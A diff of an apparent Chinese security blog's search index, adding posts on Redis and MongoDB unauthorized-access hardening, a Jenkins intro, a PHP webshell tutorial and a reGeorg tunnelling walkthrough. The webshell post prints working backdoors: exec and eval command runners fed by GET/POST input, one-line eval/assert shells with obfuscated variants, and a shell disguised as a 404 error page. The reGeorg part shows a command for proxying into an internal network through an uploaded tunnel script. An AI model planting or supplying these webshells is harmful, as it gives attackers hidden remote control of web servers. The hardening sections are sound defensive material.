+<li>iptables -A INPUT -s x.x.x.x -p tcp –dport 6379 -j ACCEPT</li>
+</ul>
+</li>
+<li>设置密码验证，修改redis.conf，去掉#requirepass前的#，后面加上密码</li>
+<li><ul>
+<li>requirepass WUFer123ex894tr&gt;&lt;)(*&amp;^   #保存，重启才能生效</li>
+</ul>
+</li>
+<li>设置运行权限最小化</li>
+<li><ul>
+<li>useradd -M -s /sbin/nologin [username] #重启才能生效</li>
+</ul>
+</li>
+<li>隐藏或禁用重要命令 #重启才能生效</li>
+<li><ul>
+<li>rename-command CONFIG “”</li>
+</ul>
+</li>
+<li><ul>
+<li>rename-command flushall “”</li>
+</ul>
+</li>
+<li><ul>
+<li>rename-command flushdb “”</li>
+</ul>
+</li>
+<li><ul>
+<li>rename-command shutdown shotdown_test</li>
+</ul>
+</li>
+<li>关注官网发布，及时更新程序或补丁</li>
+</ol>
+<h3 id="0x1B-相关参考"><a href="#0x1B-相关参考" class="headerlink" title="0x1B 相关参考"></a>0x1B 相关参考</h3><ol>
+<li><a href="https://www.runoob.com/redis/redis-tutorial.html" target="_blank" rel="noopener">redis教程</a></li>
+<li><a href="https://help.aliyun.com/knowledge_detail/37447.html" target="_blank" rel="noopener">redis安全加固</a></li>
+</ol>
+<h2 id="0x20-MongoDB"><a href="#0x20-MongoDB" class="headerlink" title="0x20 MongoDB"></a>0x20 MongoDB</h2><h3 id="0x21-简介"><a href="#0x21-简介" class="headerlink" title="0x21 简介"></a>0x21 简介</h3><ol>
+<li>MongoDB服务安装后，默认未配置访问认证授权，无需认证即可连接数据库，对数据库进行任意操作。</li>
+<li>3.0之前，默认监听0.0.0.0；3.0之后，默认监听127.0.0.1</li>
+<li>3.0之前，如果未添加用户管理账号及数据库账号，使用–auth参数启动时，本地无需账号密码即可访问数据库，远程则需认证；3.0之后，使用–auth参数启动时，无账号则本地或远程都无任何数据库访问权限。</li>
+</ol>
+<h3 id="0x22-环境与未授权无密码连接"><a href="#0x22-环境与未授权无密码连接" class="headerlink" title="0x22 环境与未授权无密码连接"></a>0x22 环境与未授权无密码连接</h3><ol>
+<li><a href="https://www.mongodb.com/download-center/community?jmp=docs" target="_blank" rel="noopener">下载MongoDB</a></li>
+<li><a href="https://docs.mongodb.com/manual/tutorial/install-mongodb-on-windows/" target="_blank" rel="noopener">windows server 2008 R2 x64安装MongoDB</a></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/32.png" alt></li>
+<li>使用navicat连接mongodb</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/33.png" alt></li>
+<li>使用nosqlbooster连接mongodb</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/34.png" alt></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/35.png" alt></li>
+</ol>
+<h3 id="0x23-mongodb相关命令"><a href="#0x23-mongodb相关命令" class="headerlink" title="0x23 mongodb相关命令"></a>0x23 mongodb相关命令</h3><ol>
+<li>help #帮助信息</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/36.png" alt></li>
+<li>show dbs #列出所有数据库</li>
+<li>use admin #选择数据库admin，一般存在数据库admin</li>
+<li>show users #列出用户信息</li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/37.png" alt></li>
+</ol>
+<h3 id="0x24-nmap简单扫描"><a href="#0x24-nmap简单扫描" class="headerlink" title="0x24 nmap简单扫描"></a>0x24 nmap简单扫描</h3><ol>
+<li>nmap -p 27017 192.168.100.3</li>
+</ol>
+<h3 id="0x25-安全加固"><a href="#0x25-安全加固" class="headerlink" title="0x25 安全加固"></a>0x25 安全加固</h3><ol>
+<li>防火墙等安全设备限制IP范围，如果无需远程访问，则只限制本地IP，建议只限制本地IP，修改配置文件mongod.cfg，bindIp: 127.0.0.1</li>
+<li>修改默认端口为其他端口</li>
+<li>设置用户密码登录认证，设置非常用账号与强密码<pre><code>&gt; use admin
+switched to db admin
+&gt; db.createUser(
+... {
+... user:&quot;tttesttt&quot;,
+... pwd:&quot;T35ttesttt&quot;,
+... roles:[{role:&quot;userAdminAnyDatabase&quot;,db:&quot;admin&quot;}]
+... }
+... )</code></pre></li>
+<li><img src="/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/38.png" alt></li>
+<li>重启mongodb服务，开启访问认证：启动时添加–auth参数</li>
+<li>修改配置文件mongod.cfg，添加<pre><code>#security:
+security:
+authorization: enabled</code></pre></li>
+<li>指定配置文件启动MongoDB：$mongod –config /etc/mongod.conf</li>
+</ol>
+<h3 id="0x24-相关参考"><a href="#0x24-相关参考" class="headerlink" title="0x24 相关参考"></a>0x24 相关参考</h3><ol>
+<li><a href="https://blog.csdn.net/weixin_43868754/article/details/104599352" target="_blank" rel="noopener">安装MongoDB</a></li>
+<li><a href="https://docs.mongodb.com/manual/reference/built-in-roles/" target="_blank" rel="noopener">mongodb内置角色</a></li>
+</ol>
+<h2 id="0x30-Jenkins"><a href="#0x30-Jenkins" class="headerlink" title="0x30 Jenkins"></a>0x30 Jenkins</h2><h3 id="0x31-简介"><a href="#0x31-简介" class="headerlink" title="0x31 简介"></a>0x31 简介</h3><ol>
+<li>Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进入后台管理服务，通过脚本执行界面从而获取服务器权限。</li>
+</ol>
+<h3 id="0x32-环境"><a href="#0x32-环境" class="headerlink" title="0x32 环境"></a>0x32 环境</h3><ol>
+<li><a href="http://mirrors.jenkins.io/" target="_blank" rel="noopener">下载地址</a></li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
+<li><a href="https://xz.aliyun.com/t/6103" target="_blank" rel="noopener">https://xz.aliyun.com/t/6103</a></li>
+<li><a href="https://www.freebuf.com/vuls/212799.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/212799.html</a></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP之webshell</title>
+    <url>/PHP%E4%B9%8Bwebshell/</url>
+    <content><![CDATA[<h2 id="0x00-webshell"><a href="#0x00-webshell" class="headerlink" title="0x00 webshell"></a>0x00 webshell</h2><p><strong>&ensp;&ensp;&ensp;&ensp;webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。——百度百科</strong></p>
+<h2 id="0x10-Get-webshell"><a href="#0x10-Get-webshell" class="headerlink" title="0x10 Get webshell"></a>0x10 Get webshell</h2><ol>
+<li>搜索引擎搜索、博客、开源或私有托管平台、各大安全论坛或社区等等。</li>
+<li><a href="https://github.com/search?q=webshell" target="_blank" rel="noopener">上github搜webshell</a></li>
+</ol>
+<h2 id="0x20-Read-webshell"><a href="#0x20-Read-webshell" class="headerlink" title="0x20 Read webshell"></a>0x20 Read webshell</h2><ol>
+<li>记事本打开，读取webshell里所有代码，可能存在的webshell登录账号与密码，获取系统信息/目录信息/文件信息的函数，数据库相关的增删改查函数，新建目录文件/上传文件/下载文件的函数，安全检测函数等等。</li>
+</ol>
+<h2 id="0x30-Analyze-webshell"><a href="#0x30-Analyze-webshell" class="headerlink" title="0x30 Analyze webshell"></a>0x30 Analyze webshell</h2><p>ini_set(‘max_execution_time’,0); #数值 0 表示没有执行时间的限制，php.ini默认30秒<br>ini_set(‘memory_limit’,’999999999M’); #内存限制设置，php.ini默认128M</p>
+<h2 id="0x31-get-system-info-function"><a href="#0x31-get-system-info-function" class="headerlink" title="0x31 get_system_info_function"></a>0x31 get_system_info_function</h2><ol>
+<li>echo $_SERVER[‘REMOTE_ADDR’]; #获取 IP 地址</li>
+<li>echo PHP_OS; #获取当前运行系统类型</li>
+<li>echo PHP_VERSION; #获取当前运行 PHP 版本</li>
+<li>echo php_uname(); #运行 PHP 的系统的有关信息</li>
+<li>echo phpversion(); #获取当前运行 PHP 版本</li>
+<li>echo (!empty($_SERVER[‘HTTPS’])) ? “https://“.$_SERVER[‘SERVER_NAME’].$_SERVER[‘REQUEST_URI’] : “http://“.$_SERVER[‘SERVER_NAME’].$_SERVER[‘REQUEST_URI’]; #获取当前URL</li>
+<li>echo (@ini_get(‘safe_mode’)?”ON”:”OFF”); #获取一个配置项（safe_mode）的值</li>
+</ol>
+<p><strong>读盘大小</strong></p>
+<pre><code>function HumanReadableFilesize($size)
+    {
+
+        $mod = 1024;
+
+        $units = explode(&#39; &#39;,&#39;B KB MB GB TB PB&#39;);
+        for ($i = 0; $size &gt; $mod; $i++) 
+        {
+            $size /= $mod;
+        }
+
+        return round($size, 2) . &#39; &#39; . $units[$i];
+    }
+
+echo HumanReadableFilesize(disk_total_space(&quot;/&quot;));</code></pre><p><strong>列出存在的所有盘符</strong></p>
+<pre><code>&lt;?php 
+function showDrives(){
+    foreach(range(&#39;A&#39;,&#39;Z&#39;) as $drive){
+        if(is_dir($drive.&#39;:\\&#39;)){
+               echo $drive.&quot;:\\&quot;.&quot;&lt;br&gt;&quot;;
+            }
+        }
+    }
+echo showDrives();</code></pre><h2 id="0x40-execution"><a href="#0x40-execution" class="headerlink" title="0x40 execution"></a>0x40 execution</h2><p><strong>Command：exec</strong></p>
+<pre><code>&lt;?php
+if(!isset($_GET[&#39;cmd&#39;])||$_GET[&#39;cmd&#39;]==&#39;&#39;){
+    $result=&#39;&#39;;
+}
+else{
+    $result=exec_all($_GET[&#39;cmd&#39;]);  #whoami
+}
+
+function exec_all($command){
+    $output=&#39;&#39;;
+    if(function_exists(&#39;exec&#39;)){ #function_exists — 如果给定的函数已经被定义就返回 TRUE
+        exec($command,$output); #exec — 执行一个外部程序
+        $output=join(&quot;\n&quot;,$output);
+    }
+    return(htmlspecialchars($output));
+}
+echo $result;</code></pre><p><strong>Code：eval</strong></p>
+<pre><code>&lt;?php
+if(isset($_POST[&#39;code&#39;])&amp;&amp;$_POST[&#39;code&#39;])
+{
+    $code=str_replace(&quot;&lt;?php&quot;,&quot;&quot;,$_POST[&#39;code&#39;]);
+    $code=str_replace(&quot;&lt;?&quot;,&quot;&quot;,$code);
+    $code=str_replace(&quot;?&gt;&quot;,&quot;&quot;,$code);
+    echo htmlspecialchars(eval($code));
+}</code></pre><h2 id="0x50-Other"><a href="#0x50-Other" class="headerlink" title="0x50 Other"></a>0x50 Other</h2><?php echo $_SERVER['PHP_SELF'];?><p> #获取当前执行脚本的绝对路径及文件名</p>
+<h2 id="0xE0-shell"><a href="#0xE0-shell" class="headerlink" title="0xE0 shell"></a>0xE0 shell</h2><h3 id="0xE1-PHP-shell"><a href="#0xE1-PHP-shell" class="headerlink" title="0xE1 PHP shell"></a>0xE1 PHP shell</h3><p><strong>一句话</strong></p>
+<pre><code>&lt;?php eval($_POST[&#39;test&#39;]);?&gt;
+&lt;?php @eval($_POST[&#39;test&#39;]);?&gt;  #@作用：屏蔽错误信息
+&lt;?php assert($_POST[&#39;test&#39;]);?&gt;
+&lt;?$_GET[&#39;test&#39;]($_POST[&#39;test1&#39;]);?&gt;
+&lt;script language=&quot;php&quot;&gt;@eval($_POST[test])&lt;/script&gt;
+&lt;?php $c=&#39;ass&#39;.&#39;ert&#39;;${c}($_POST[&quot;test&quot;]);?&gt;
+&lt;?php $k = str_replace(&quot;8&quot;,&quot;&quot;,&quot;a8s88s8e8r88t&quot;);$k($_POST[&quot;test&quot;]); ?&gt;</code></pre><p><strong>404一句话</strong></p>
+<pre><code>&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;/body&gt;&lt;/html&gt;
+&lt;?php
+@preg_replace(&quot;/[pageerror]/e&quot;,$_POST[&#39;test&#39;],&quot;error&quot;);
+header(&#39;HTTP/1.1 404 Not Found&#39;);
+?&gt;</code></pre><h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2>]]></content>
+      <tags>
+        <tag>PHP</tag>
+        <tag>shell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>提权之windows-DLL注入</title>
     <url>/%E6%8F%90%E6%9D%83%E4%B9%8Bwindows-DLL%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="0x00-DLL注入"><a href="#0x00-DLL注入" class="headerlink" title="0x00 DLL注入"></a>0x00 DLL注入</h2><ol>
@@ -109,6 +1131,7 @@
 <h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a><strong>嗅探</strong></h3><p>&ensp;&ensp;&ensp;&ensp;一般指嗅探器。嗅探器 可以获取网络上流经的数据包。 用集线器hub组建的网络是基于共享的原理的， 局域网内所有的计算机都接收相同的数据包， 而网卡构造了硬件的“过滤器“ 通过识别MAC地址过滤掉和自己无关的信息， 嗅探程序只需关闭这个过滤器， 将网卡设置为“混杂模式“就可以进行嗅探 用交换机switch组建的网络是基于“交换“原理的 ，交换机不是把数据包发到所有的端口上， 而是发到目的网卡所在的端口。</p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a><strong>提权</strong></h3><p>&ensp;&ensp;&ensp;&ensp;提高自己在服务器中的权限，主要针对网站入侵过程中，当入侵某一网站时，通过各种漏洞提升WEBSHELL权限以夺得该服务器权限。</p>
 <h3 id="CGI-通用网关接口"><a href="#CGI-通用网关接口" class="headerlink" title="CGI 通用网关接口"></a><strong>CGI 通用网关接口</strong></h3><p>&ensp;&ensp;&ensp;&ensp;公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与浏览器进行交互，还可通过数据API与数据库服务器等外部数据源进行通信，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有服务器都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用命令行参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信。</p>
+<h2 id="0x01-win常用常量"><a href="#0x01-win常用常量" class="headerlink" title="0x01 win常用常量"></a>0x01 win常用常量</h2><p><img src="/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%99%BE%E7%A7%91/1.png" alt></p>
 <h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
 <li><a href="https://baike.baidu.com/" target="_blank" rel="noopener">百度百科</a></li>
 </ol>
@@ -951,27 +1974,6 @@ void main()
       </tags>
   </entry>
   <entry>
-    <title>CTF之隐写术</title>
-    <url>/CTF%E4%B9%8B%E9%9A%90%E5%86%99%E6%9C%AF/</url>
-    <content><![CDATA[<h2 id="0x00-隐写术"><a href="#0x00-隐写术" class="headerlink" title="0x00 隐写术"></a>0x00 隐写术</h2><ol>
-<li>隐写术（Steganography）：一门关于信息隐藏的技巧与科学。所谓信息隐藏指的是不让除预期的接收者之外的任何人获取到信息的内容。</li>
-</ol>
-<h2 id="0x10-PNG"><a href="#0x10-PNG" class="headerlink" title="0x10 PNG"></a>0x10 PNG</h2><ol>
-<li>图片隐写术：信息隐藏在图片中，不仅不会影响图片的正常浏览，通过网络上传下载，经过特定的方式解密，还能还原原隐藏的明文信息。</li>
-</ol>
-<h2 id="0x11-PNG文件格式分析"><a href="#0x11-PNG文件格式分析" class="headerlink" title="0x11 PNG文件格式分析"></a>0x11 PNG文件格式分析</h2><ol>
-<li></li>
-</ol>
-<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
-<li><a href="https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E9%9A%90%E5%86%99%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8PNG%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E9%9A%90%E8%97%8FPayload/</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python与编码解码</title>
     <url>/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/</url>
     <content><![CDATA[<h2 id="0x00-python2-和-python3"><a href="#0x00-python2-和-python3" class="headerlink" title="0x00 python2 和 python3"></a>0x00 python2 和 python3</h2><ol>
@@ -1106,10 +2108,25 @@ if __name__ == &#39;__main__&#39;:
 </ol>
 <h2 id="0x30-binascii模块"><a href="#0x30-binascii模块" class="headerlink" title="0x30 binascii模块"></a>0x30 binascii模块</h2><pre><code>import binascii
 
-str=&#39;python3&#39;
-str_hex=str.encode(&#39;utf-8&#39;)
-print(binascii.b2a_hex(str_hex))</code></pre><ol>
+str_raw=&#39;python3&#39;
+print(str_raw,type(str_raw)) #原字符串与类型
+
+str_bytes=str_raw.encode(&#39;utf-8&#39;) #转换成二进制数据与新类型
+print(str_bytes,type(str_bytes))
+
+print(binascii.b2a_hex(str_bytes)) #bytes转16进制的ascii
+
+str_ascii=binascii.b2a_hex(str_bytes) 
+print(binascii.a2b_hex(str_ascii)) #ascii转bytes</code></pre><ol>
 <li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/22.png" alt></li>
+</ol>
+<h3 id="0x31-string转bytes"><a href="#0x31-string转bytes" class="headerlink" title="0x31 string转bytes"></a>0x31 string转bytes</h3><ol>
+<li>bytes()</li>
+<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/23.png" alt></li>
+</ol>
+<h3 id="0x32-bytes转string"><a href="#0x32-bytes转string" class="headerlink" title="0x32 bytes转string"></a>0x32 bytes转string</h3><ol>
+<li>str_bytes_utf8.decode() #默认不用填，指定编码方式，则填，str_bytes_utf8.decode(‘gb2312’)</li>
+<li><img src="/python%E4%B8%8E%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/24.png" alt></li>
 </ol>
 <h2 id="0x40-uuencode-amp-amp-uudecode"><a href="#0x40-uuencode-amp-amp-uudecode" class="headerlink" title="0x40 uuencode &amp;&amp; uudecode"></a>0x40 uuencode &amp;&amp; uudecode</h2><ol>
 <li><a href="https://github.com/python/cpython/blob/master/Lib/uu.py" target="_blank" rel="noopener">uu模块</a></li>
@@ -1373,22 +2390,6 @@ save</code></pre><p><strong>URL编码</strong></p>
 ]]></content>
       <tags>
         <tag>漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>John-the-Ripper</title>
-    <url>/John-the-Ripper/</url>
-    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p><img src="/John-the-Ripper/1.jfif" alt></p>
-<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><ol>
-<li></li>
-</ol>
-<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
-<li><a href="https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/" target="_blank" rel="noopener">https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/</a></li>
-<li><a href="https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/" target="_blank" rel="noopener">https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>工具</tag>
       </tags>
   </entry>
   <entry>
@@ -2408,135 +3409,6 @@ Miscellaneous:
       </tags>
   </entry>
   <entry>
-    <title>CTF之文件格式</title>
-    <url>/CTF%E4%B9%8B%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol>
-<li><img src="/CTF%E4%B9%8B%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/1.jfif" alt></li>
-<li>文件格式（或文件类型）是指电脑为了存储信息而使用的对信息的特殊编码方式，是用于识别内部储存的资料。比如有的储存图片，有的储存程序，有的储存文字信息。每一类信息，都可以一种或多种文件格式保存在电脑存储中。每一种文件格式通常会有一种或多种扩展名可以用来识别，但也可能没有扩展名。扩展名可以帮助应用程序识别的文件格式。</li>
-</ol>
-<h2 id="0x01-16进制文件头"><a href="#0x01-16进制文件头" class="headerlink" title="0x01 16进制文件头"></a>0x01 16进制文件头</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><pre><code>bmp：42 4D
-     42 4D 3E
-
-gif：    47 49 46 38（GIF8）
-     47 49 46 38 37 61（GIF87a）
-     47 49 46 38 39 61（GIF89a）
-
-jpg;jpe;jpeg：FF D8 FF
-              FF D8 FF E0 00
-              FF D8 FF FE 00
-
-png：89 50 4E
-     89 50 4E 47
-     89 50 4E 47 0D 0A
-     89 50 4E 47 0D 0A 1A 0A
-
-psd：38 42 50 53
-
-psp：7E 42 4B 00
-
-TIF;TIFF：49 20 49
-
-tif;tiff：49 49 2A
-
-tif;tiff：49 49 2A 00
-
-TIF;TIFF：4D 4D 00 2A
-
-tif;tiff：4D 4D 2A
-
-TIF;TIFF：4D 4D 00 2B</code></pre><h3 id="压缩文件"><a href="#压缩文件" class="headerlink" title="压缩文件"></a>压缩文件</h3><pre><code>7z：37 7A BC AF 27 1C
-
-bz;bz2：42 5A 68
-
-BZ2;TAR.BZ2;TBZ2;TB2：42 5A 68
-
-gz;tar;tgz：1F 8B
-
-gz;tgz：1F 8B 08
-
-JAR：4A 41 52 43 53 00
-
-lha：2D 6C 68 35 2D
-
-lha;lzh：[2 byte offset] 2D 6C 68
-
-tar.z：1F 9D 90
-
-z：1F 9D
-
-Z：1F 9D 8C
-
-ZIP：50 4B 03
-
-zip;jar;zipx：50 4B 03 04
-
-zip：50 4B 30 30
-
-Zip：50 4B 30 30 50 4B 03 04</code></pre><h3 id="可执行文件"><a href="#可执行文件" class="headerlink" title="可执行文件"></a>可执行文件</h3><pre><code>COM, DLL, DRV, EXE, PIF, QTS, QTX, SYS：4D 5A
-
-COM：4D 5A EE
-
-COM：E9 3B 03
-
-elf：7F 45 4C 46 01 01 01 00
-
-exe; dll; drv; vxd; sys; ocx; vbx：4D 5A
-
-exe; dll; drv; vxd; sys; ocx; vbx：4D 5A
-
-exe; com; 386; ax; acm; sys; dll; drv; flt; fon; ocx;   scr; lrc; vxd; cpl; x32：4D 5A</code></pre><h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><ol>
-<li><a href="https://blog.csdn.net/qq_41079177/article/details/79221638" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/79221638</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>app脱壳</title>
-    <url>/app%E8%84%B1%E5%A3%B3/</url>
-    <content><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ol>
-<li><a href="https://github.com/DrizzleRisk/drizzleDumper" target="_blank" rel="noopener">脱壳工具</a></li>
-<li>adb.exe</li>
-<li>安卓模拟器</li>
-</ol>
-<h2 id="0x01-360壳"><a href="#0x01-360壳" class="headerlink" title="0x01 360壳"></a>0x01 360壳</h2><ol>
-<li>查壳</li>
-<li><img src="/app%E8%84%B1%E5%A3%B3/1.png" alt></li>
-<li>反编译，查看代码</li>
-<li><img src="/app%E8%84%B1%E5%A3%B3/2.png" alt></li>
-<li>adb.exe connect 127.0.0.1:模拟器专用端口</li>
-<li>adb.exe push C:...\drizzleDumper（windows绝对路径） /data/data/drizzleDumper（模拟器的路径，路径随你意）</li>
-<li>adb.exe shell</li>
-<li>cd /data/data</li>
-<li>chmod 777 drizzleDumper</li>
-<li>./drizzleDumper <apkagename> </apkagename></li>
-<li>失败~ 告辞</li>
-</ol>
-<h2 id="0xFF"><a href="#0xFF" class="headerlink" title="0xFF"></a>0xFF</h2><ol>
-<li><a href="https://www.52pojie.cn/thread-685918-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-685918-1-1.html</a></li>
-<li><a href="https://www.freebuf.com/sectool/105147.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/105147.html</a></li>
-</ol>
-]]></content>
-      <tags>
-        <tag>脱壳</tag>
-        <tag>app</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP代码审计学习2</title>
-    <url>/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/</url>
-    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
-<li>留言</li>
-</ol>
-<h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2>]]></content>
-      <tags>
-        <tag>PHP</tag>
-        <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>File-Upload</title>
     <url>/File-Upload/</url>
     <content><![CDATA[<h2 id="0x00-File-Upload"><a href="#0x00-File-Upload" class="headerlink" title="0x00 File-Upload"></a>0x00 File-Upload</h2><p><img src="/File-Upload/upload.png" alt></p>
@@ -3224,12 +4096,15 @@ int main()
 <h2 id="0x30-reGeorg"><a href="#0x30-reGeorg" class="headerlink" title="0x30 reGeorg"></a>0x30 <a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg</a></h2><ol>
 <li><strong>环境：</strong></li>
 <li>控制主机 192.168.100.1</li>
-<li>服务器 192.168.100.4，192.168.100.5</li>
+<li>服务器 192.168.100.4，192.168.100.3</li>
+<li>proxifier：一款socks5客户端</li>
+<li><a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">reGeorg脚本</a></li>
+<li></li>
 <li>原理：上传服务器可解析的脚本，服务器成功解析后，本地主机监听指定端口通过http/https隧道转发命令到服务器，建立一个socks协议代理进行内网穿透，服务器必须支持aspx/php/jsp等中的一种。</li>
 <li>reGeorg分为客户端与服务端，服务端有php/aspx/jsp/js等多个版本，客户端由Python2编写。</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/11.png" alt></li>
-<li>上传服务器能解析的脚本（这里是tunnel.nosocket.php）</li>
-<li>python reGeorgSocksProxy.py -p 8888 -u <a href="http://192.168.100.5/tunnel.nosocket.php" target="_blank" rel="noopener">http://192.168.100.5/tunnel.nosocket.php</a></li>
+<li>上传服务器能解析的脚本（这里是tunnel.jsp）</li>
+<li>python reGeorgSocksProxy.py -p 8888 -u <a href="http://192.168.100.3:8080/tunnel.jsp" target="_blank" rel="noopener">http://192.168.100.3:8080/tunnel.jsp</a></li>
 <li>关键字：Georg says, ‘All seems fine’，说明隧道成功建立</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/12.png" alt></li>
 <li>同样，上传脚本后，通过浏览器访问也可验证代理成功</li>
@@ -3239,7 +4114,15 @@ int main()
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/15.png" alt></li>
 <li>Direct：不经过代理，Proxy SOCKS5 127.0.0.1：经过代理</li>
 <li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/16.png" alt></li>
-<li></li>
+<li>以mstsc.exe为例，定位到C:\Windows\System32\mstsc.exe，右键——proxifier——proxy socks5 127.0.0.1</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/17.png" alt></li>
+<li>直接选定用户，输入密码登录就行。</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/18.png" alt></li>
+<li>proxifier和cmd就可以看到代理流量交互的信息了</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/19.png" alt></li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/20.png" alt></li>
+<li>php版的tunnel.nosocket.php，失败了，卡住不动了</li>
+<li><img src="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/21.png" alt></li>
 </ol>
 ]]></content>
       <tags>
@@ -3822,7 +4705,7 @@ pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre></li>
     <content><![CDATA[<h2 id="0x00-PHP"><a href="#0x00-PHP" class="headerlink" title="0x00 PHP"></a>0x00 PHP</h2><ol>
 <li>环境：phpstudy各版本PHP</li>
